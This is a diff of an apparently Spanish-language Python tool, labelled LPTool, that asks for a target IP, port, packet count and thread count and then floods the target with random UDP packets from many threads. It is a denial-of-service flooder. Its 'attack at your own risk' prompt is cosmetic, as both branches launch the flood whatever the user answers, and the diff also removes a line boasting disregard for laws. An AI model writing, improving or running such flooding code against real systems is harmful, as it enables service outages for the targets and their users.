@@ -2,11 +2,11 @@ import random
 import socket
 import threading
 
-ip = str(input(" IP - "))
-puerto = int(input(" Puerto - "))
-times = int(input(" Paquetes - "))
-threads = int(input(" Conexiones - "))
-choice = str(input(" El ataque es bajo tu responsabilidad, estas de acuerdo?: y/n"))
+ip = str(input("[LPTool] IP - "))
+puerto = int(input("[LPTool] Puerto - "))
+times = int(input("[LPTool] Paquetes - "))
+threads = int(input("[LPTool] Conexiones - "))
+choice = str(input("[LPTool] El ataque es bajo tu responsabilidad, estas de acuerdo?: "))
 def udpddos():
 	data = random._urandom(1024)
 	while True:
@@ -24,6 +24,5 @@ for y in range(threads):
 		th = threading.Thread(target = udpddos)
 		th.start()
 	else:
-		print("We don't give a fuck about laws")
 		th = threading.Thread(target = udpddos)
 		th.start()
